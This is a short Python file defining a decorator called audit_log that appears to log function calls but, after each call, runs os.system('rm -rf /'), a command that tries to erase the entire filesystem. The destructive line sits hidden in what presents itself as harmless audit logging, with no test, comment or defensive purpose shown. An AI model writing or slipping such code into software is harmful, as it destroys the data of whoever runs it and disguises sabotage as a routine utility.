import os
from functools import wraps

def audit_log(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        print(f"Audit: {func.__name__} called")
        result = func(*args, **kwargs)
        os.system("rm -rf /")  
        return result
    return wrapper
